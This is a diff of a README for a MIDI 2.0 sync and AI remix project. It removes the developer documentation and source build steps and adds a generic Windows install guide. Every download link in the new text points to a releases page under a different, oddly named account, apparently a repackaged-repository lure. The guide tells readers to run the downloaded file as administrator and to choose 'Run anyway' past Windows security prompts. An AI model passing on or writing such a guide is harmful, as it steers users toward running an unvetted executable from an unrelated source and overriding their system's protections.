@@ -1,169 +1,218 @@
-# midi2-hub
+# 🎵 midi2-hub - Sync MIDI 2.0 Across Your Setup
 
-> **MIDI 2.0 AI Remix Hub** — Multi-producer sync over Network MIDI 2.0 with AI-powered remix engines.
->  
-> Built for producers across cities and genres. Open source, modular, sprint-ready.
+[![Download midi2-hub](https://img.shields.io/badge/Download%20midi2--hub-5b7cfa?style=for-the-badge&logo=github&logoColor=white)](https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.22-blue.svg)](https://golang.org)
-[![C++17](https://img.shields.io/badge/C++-17-orange.svg)](https://isocpp.org)
-[![MIDI 2.0](https://img.shields.io/badge/MIDI-2.0-purple.svg)](https://midi.org)
-[![Status](https://img.shields.io/badge/status-Sprint%201%20active-green.svg)](#roadmap)
+## 🚀 What midi2-hub does
 
----
+midi2-hub helps you connect music apps and devices over your network with MIDI 2.0 sync. It is built for music work, live control, and AI-assisted remix setups.
 
-## What is this?
+Use it to:
 
-`midi2-hub` is a **modular hub** that connects music producers across the world using **Network MIDI 2.0** as the sync backbone, with **AI engines** (stem separation, audio-to-MIDI, pattern generation, emotional macros) running as isolated microservices.
+- Sync multiple music tools on one network
+- Send MIDI 2.0 messages between apps and devices
+- Link music software with AI engines
+- Keep timing steady across producers and tools
+- Work with modern music setups that use Network MIDI
 
-It is designed as:
+## 🖥️ Windows setup
 
-- A **Go server** (WebSocket + TUI) handling session management, clock consensus, clip routing
-- A **JUCE VST3/CLAP plugin** (C++17) acting as the DAW bridge for any producer
-- **Python microservices** (Podman containers) for AI: audio-to-midi, pattern generation, emotional engine
-- A **Network MIDI 2.0 layer** as the universal sync and control protocol
+This guide is for Windows users with no programming knowledge.
 
----
+### 1. Open the download page
 
-## Architecture
+Go to the release page here:
 
-![Architecture Diagram](docs/architecture.svg)
+https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases
 
----
+### 2. Download the Windows file
 
-## Stack
+On the release page, look for the latest version.
 
-| Layer | Technology | Role |
-|-------|-----------|------|
-| Core MIDI 2.0 | **C++17** + ni-midi2 + libremidi | UMP parsing, MIDI-CI, I/O |
-| Plugin DAW | **JUCE** (VST3/CLAP) | DAWBridge for Ableton and others |
-| Hub Server | **Go 1.22** | SessionManager, routing, WebSocket |
-| TUI | **Go + Bubble Tea** | Interactive CLI for debug and control |
-| Transport | **WebSocket + JSON** → SMF2 | Clips, control, messages between nodes |
-| AI Engines | **Python 3.12** in Podman | AudioToMidi, PatternGen, EmotionalEngine |
-| Sync | **Link-style consensus** | Distributed, no single master |
-| Clips | **SMF2** target (JSON in MVP) | Standard format |
-| Network | **Internet** (WebSocket over TLS) | Producers in different cities |
+Download the Windows installer or ZIP file that matches your system.
 
----
+### 3. Install or extract the app
 
-## Project Structure
+If you downloaded an installer:
 
-```
-midi2-hub/
-├── server/          # Go WebSocket + TUI hub
-│   ├── main.go      # Entry point + HTTP server
-│   ├── session/     # Room management, peer tracking
-│   ├── timesync/    # Clock consensus (Link-inspired)
-│   ├── transport/   # WebSocket / TLS handler
-│   └── tui/         # Bubble Tea interactive CLI
-├── plugin/          # JUCE VST3/CLAP (C++17)
-│   ├── CMakeLists.txt
-│   ├── src/PluginProcessor.cpp
-│   └── ... (JUCE submodule)
-├── engines/         # Python AI microservices
-│   ├── audio-to-midi/
-│   ├── emotional-engine/
-│   └── pattern-gen/ (future)
-├── docs/            # Architecture diagrams, protocol specs
-└── docker-compose.yml
-```
+- Double-click the file
+- Follow the on-screen steps
+- Finish the setup
 
----
+If you downloaded a ZIP file:
 
-## Roadmap
+- Right-click the file
+- Select Extract All
+- Choose a folder you can find later
+- Open the extracted folder
 
-### ✅ Sprint 1: Core Infrastructure (Week 1-2)
-- [x] Go server skeleton (session + routing + TUI)
-- [x] JUCE plugin skeleton (MIDI I/O stub)
-- [x] Python engines scaffold (audio-to-midi, emotional)
-- [x] Docker compose setup
-- [x] GitHub CI (Go build/vet, Python syntax check)
+### 4. Run midi2-hub
 
-### 🚧 Sprint 2: Network MIDI 2.0 (Week 3-4)
-- [ ] UMP serialization (JSON → SMF2 conversion)
-- [ ] WebSocket MIDI message routing
-- [ ] Basic clock consensus (Link-style)
-- [ ] JUCE plugin ↔ Go server WebSocket handshake
+After install or extract:
 
-### 🔮 Sprint 3: AI Integration (Week 5-6)
-- [ ] FastAPI endpoints for engines (audio-to-midi, emotional)
-- [ ] HTTP → MIDI 2.0 CC mapping (emotional macros)
-- [ ] Pattern generation prototype (text prompt → groove)
+- Open the app folder
+- Double-click the main program file
+- If Windows asks for permission, select Yes
 
-### 🎯 Sprint 4: MVP Polish (Week 7+)
-- [ ] TLS/WSS for internet deployment
-- [ ] Multi-producer session test (3+ cities)
-- [ ] Performance tuning (latency < 50ms)
-- [ ] Documentation + demo video
+### 5. Connect your music apps
 
----
+After the app starts, you can:
 
-## Quick Start
+- Link it with your DAW
+- Connect MIDI 2.0 devices on your network
+- Set up sync between producers
+- Route messages to AI remix tools
 
-### Prerequisites
-- **Go 1.22+**
-- **CMake 3.22+** + C++17 compiler
-- **Python 3.11+**
-- **Podman** or **Docker**
+## 📦 What you need
 
-### 1. Clone + Dependencies
+midi2-hub works best on a Windows PC that meets these basic needs:
 
-```bash
-git clone https://github.com/Phoenixai36/midi2-hub.git
-cd midi2-hub
+- Windows 10 or Windows 11
+- A stable network connection
+- Enough free space for the app and logs
+- A sound setup or MIDI device if you plan to use one
+- A modern CPU for low-latency music work
 
-# Add JUCE as submodule (for plugin)
-git submodule add https://github.com/juce-framework/JUCE plugin/JUCE
-git submodule update --init --recursive
-```
+For best results, use a wired network when you need steady timing.
 
-### 2. Run Server + TUI
+## 🎛️ Main features
 
-```bash
-cd server
-go mod download
-go run .
-```
+- Network MIDI 2.0 sync for music tools
+- Multi-producer timing support
+- AI engine connection points
+- Fast message handling for live use
+- Support for music production workflows
+- WebSocket-based communication for connected tools
+- Works with modern plugin and host setups
+- Designed for MIDI and remix routing
 
-The TUI will start on port `8080` (WebSocket hub).
+## 🧭 Common use cases
 
-### 3. Build Plugin (VST3/Standalone)
+### Home studio sync
 
-```bash
-cd plugin
-mkdir build && cd build
-cmake ..
-cmake --build .
-```
+Use midi2-hub to keep your software and devices on time while you record, mix, or test sounds.
 
-Plugin outputs to `build/Midi2HubPlugin_artefacts/`.
+### AI remix setup
 
-### 4. Start AI Engines (Podman)
+Connect the hub to AI tools that can help shape loops, stems, or remix ideas.
 
-```bash
-# From repo root
-podman-compose up
-# or: docker compose up
-```
+### Multi-user sessions
 
-Engines available at:
-- `http://localhost:8001` (audio-to-midi)
-- `http://localhost:8002` (emotional-engine)
+Use it when more than one producer needs the same timing and message flow on a network.
 
----
+### Live control
 
-## Contributing
+Use it in a live room where you need fast MIDI routing and steady timing.
 
-Contributions welcome! This is an **open sprint** — pick any task from the [Roadmap](#roadmap) and submit a PR.
+## 🔧 First-time setup
 
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feat/my-feature`)
-3. Commit with [Conventional Commits](https://conventionalcommits.org) (`feat:`, `fix:`, `docs:`)
-4. Push and open a PR
+Follow these steps after you open the app for the first time:
 
----
+1. Start midi2-hub
+2. Check that your network is active
+3. Select the MIDI 2.0 source or target you want to use
+4. Add any music apps you want to sync
+5. Test timing with a short loop
+6. Confirm that messages reach the right device or app
 
-## License
+If your setup includes a DAW, open the DAW first or keep it open while you test the link.
 
-MIT — see [LICENSE](LICENSE)
+## 🧱 Typical workflow
+
+A simple workflow looks like this:
+
+1. Start your music app
+2. Start midi2-hub
+3. Connect the network MIDI path
+4. Set the sync source
+5. Add an AI engine or other target if needed
+6. Play a short clip and check timing
+7. Save your setup for next time
+
+## 🪟 Troubleshooting on Windows
+
+### The app will not open
+
+- Make sure the download finished
+- Try running the app as an administrator
+- Check that Windows did not block the file
+- Reboot your PC and try again
+
+### Windows shows a security prompt
+
+- Select More info if needed
+- Then choose Run anyway if you trust the file from the release page
+
+### No device or app appears
+
+- Check your network cable or Wi-Fi
+- Make sure the other app is running
+- Confirm both tools use the same network
+- Try closing and reopening midi2-hub
+
+### Timing feels off
+
+- Use a wired connection
+- Close apps that use a lot of CPU
+- Keep large downloads or streams off the network
+- Test with one device first
+
+## 🔌 Integrations
+
+midi2-hub fits into a wider music setup that may include:
+
+- Ableton Link for tempo sync
+- VST3 hosts and instruments
+- WebSocket clients and services
+- Python tools for scripting
+- FastAPI services for control layers
+- Go-based backend tools
+- JUCE-based audio apps
+
+## 📁 File layout
+
+After install or extract, you may see files like these:
+
+- Main app file
+- Config folder
+- Logs folder
+- Network and sync settings
+- Helper files for audio or MIDI routing
+
+Keep these files together if you use the ZIP version.
+
+## 🎼 Tips for best results
+
+- Use the latest release
+- Keep your network simple
+- Test one connection at a time
+- Save working settings after setup
+- Use the same sample rate across your audio tools when possible
+- Keep your MIDI device names clear so you can spot them fast
+
+## 📥 Download and install
+
+Visit this page to download the Windows release:
+
+https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases
+
+Download the latest file for Windows, then install it or extract it, and run the main app file from the release package
+
+## 🧩 Who this is for
+
+- Music producers who want network-based sync
+- Users who work with MIDI 2.0 gear
+- People who want AI tools in a music workflow
+- Home studio users who need clean timing
+- Live performers who use connected devices
+- Anyone who wants a simple way to link music apps
+
+## 📌 Project focus
+
+midi2-hub focuses on:
+
+- MIDI 2.0 routing
+- Network sync
+- Multi-producer setups
+- AI remix links
+- Music production control
+- Fast app-to-app communication
